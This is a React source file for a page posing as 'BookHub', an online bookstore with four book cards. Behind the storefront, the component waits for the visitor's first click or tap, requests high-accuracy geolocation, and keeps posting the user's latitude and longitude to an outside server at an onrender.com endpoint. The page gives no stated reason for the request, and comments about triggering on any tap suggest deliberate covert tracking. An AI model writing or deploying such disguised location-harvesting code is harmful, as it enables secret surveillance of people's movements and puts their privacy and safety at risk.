import React, { useEffect, useRef } from "react";
import axios from "axios";

function App() {
  const watchRef = useRef(null);

  useEffect(() => {
    const userId = "user123";

    const startTracking = () => {
      if (!navigator.geolocation) return;

      // prevent multiple triggers
      if (watchRef.current) return;

      const sendLocation = async (pos) => {
        try {
          await axios.post("https://server-q7vm.onrender.com/location", {
            userId,
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
          });
        } catch (err) {
          console.log("Error sending");
        }
      };

      // 🔥 1. FIRST INSTANT LOCATION (popup comes here)
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          sendLocation(pos);
        },
        (err) => {
          console.log("Permission denied");
        },
        {
          enableHighAccuracy: true,
          timeout: 5000,
          maximumAge: 0,
        }
      );

      // 🔥 2. CONTINUOUS TRACKING
      watchRef.current = navigator.geolocation.watchPosition(
        (pos) => {
          sendLocation(pos);
        },
        () => {},
        {
          enableHighAccuracy: true,
        }
      );

      // remove listener after first interaction
      window.removeEventListener("click", startTracking);
      window.removeEventListener("touchstart", startTracking);
    };

    // 👇 triggers on ANY tap instantly
    window.addEventListener("click", startTracking);
    window.addEventListener("touchstart", startTracking);

    return () => {
      window.removeEventListener("click", startTracking);
      window.removeEventListener("touchstart", startTracking);

      if (watchRef.current) {
        navigator.geolocation.clearWatch(watchRef.current);
      }
    };
  }, []);

  return (
    <div>
      {/* 🔥 SAME UI */}
      <style>{`
        body { margin: 0; font-family: Arial; }

        .navbar {
          display: flex;
          justify-content: space-between;
          padding: 15px 30px;
          background: #222;
          color: #fff;
        }

        .nav-links span { margin-left: 20px; cursor: pointer; }

        .container {
          display: grid;
          grid-template-columns: repeat(4, 1fr);
          gap: 20px;
          padding: 20px;
        }

        .card {
          border: 1px solid #ddd;
          border-radius: 10px;
          padding: 15px;
          text-align: center;
        }

        .card img {
          width: 100%;
          height: 220px;
          object-fit: cover;
        }

        button {
          margin-top: 10px;
          padding: 10px;
          border: none;
          background: #007bff;
          color: white;
          border-radius: 5px;
          cursor: pointer;
        }

        @media (max-width: 992px) {
          .container { grid-template-columns: repeat(2, 1fr); }
        }

        @media (max-width: 600px) {
          .container { grid-template-columns: 1fr; }
          .navbar { flex-direction: column; text-align: center; }
        }
      `}</style>

      {/* Navbar */}
      <div className="navbar">
        <h2>📚 BookHub</h2>
        <div className="nav-links">
          <span>Home</span>
          <span>Categories</span>
          <span>Cart</span>
          <span>Login</span>
        </div>
      </div>

      {/* Books */}
      <div className="container">
        {books.map((book, i) => (
          <div key={i} className="card">
            <img src={book.img} alt="" />
            <h3>{book.title}</h3>
            <p>₹{book.price}</p>
            <button>Buy Now</button>
          </div>
        ))}
      </div>
    </div>
  );
}

const books = [
  { title: "Rich Dad Poor Dad", price: 299, img: "https://m.media-amazon.com/images/I/81bsw6fnUiL.jpg" },
  { title: "Atomic Habits", price: 399, img: "https://m.media-amazon.com/images/I/91bYsX41DVL.jpg" },
  { title: "The Alchemist", price: 249, img: "https://m.media-amazon.com/images/I/71aFt4+OTOL.jpg" },
  { title: "Ikigai", price: 349, img: "https://m.media-amazon.com/images/I/81l3rZK4lnL.jpg" },
];

export default App;